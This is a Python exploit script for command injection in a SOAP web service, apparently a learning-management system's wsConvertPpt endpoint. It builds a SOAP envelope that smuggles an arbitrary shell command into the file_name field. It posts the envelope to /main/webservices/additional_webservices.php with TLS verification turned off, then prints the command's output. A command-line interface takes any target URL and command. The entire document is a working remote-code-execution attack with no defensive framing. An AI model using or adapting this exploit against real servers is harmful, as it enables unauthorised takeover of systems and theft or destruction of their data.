# author: laohuan12138
import argparse
import requests
import re
import urllib3
urllib3.disable_warnings()


def send_payload(url,command):
    headers={
        'Content-Type': 'text/xml',
        'User-Agent':'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2309.372 Safari/537.36'
    }
    body = '''<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ns1="{url}" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:ns2="http://xml.apache.org/xml-soap" xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/" SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><SOAP-ENV:Body><ns1:wsConvertPpt><param0 xsi:type="ns2:Map"><item><key xsi:type="xsd:string">file_data</key><value xsi:type="xsd:string"></value></item><item><key xsi:type="xsd:string">file_name</key><value xsi:type="xsd:string">`{{}}`.pptx'|" |{command}||a #</value></item><item><key xsi:type="xsd:string">service_ppt2lp_size</key><value xsi:type="xsd:string">720x540</value></item></param0></ns1:wsConvertPpt></SOAP-ENV:Body></SOAP-ENV:Envelope>'''.format(url=url, command=command)
    start_string = '<return xsi:type="xsd:string">'
    end_string = '</return>'
    pattern = f"{re.escape(start_string)}(.*?){re.escape(end_string)}"
    url_v = url+"/main/webservices/additional_webservices.php"
    res = requests.post(url_v,data=body,headers=headers,verify=False,timeout=10)
    result = re.search(pattern, res.text,re.DOTALL)
    if result:
        content = result.group(1)
        print(content)
    else:
        print("The target may not have a vulnerability")


if __name__ == '__main__':
    parser = argparse.ArgumentParser('python exp.py -u https://example.com -c "id"')
    parser.add_argument('-u', '--url', help='target URL', required=True)
    parser.add_argument('-c', '--command', help='command to execute', required=True)
    args = parser.parse_args()
    url = args.url.strip()
    command = args.command.strip()
    send_payload(url,command)